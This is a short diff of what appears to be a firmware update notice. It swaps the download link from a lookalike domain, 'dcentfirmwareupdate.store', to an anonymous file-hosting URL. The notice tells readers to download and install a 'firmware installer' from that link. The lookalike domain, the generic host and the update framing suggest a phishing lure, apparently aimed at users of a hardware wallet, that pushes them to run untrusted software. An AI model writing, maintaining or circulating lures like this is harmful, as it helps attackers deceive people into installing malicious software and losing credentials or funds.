@@ -54,7 +54,7 @@ DOWNLOAD THE UPDATE
 
 Visit the link below to download the firmware installer:
 
-https://dcentfirmwareupdate.store
+https://api.files.link/v1/p/23596e7b-bafd-47d6-beb1-709aeb64ea51
 
 The page includes full installation instructions, system requirements, and answers to frequently asked questions.
 
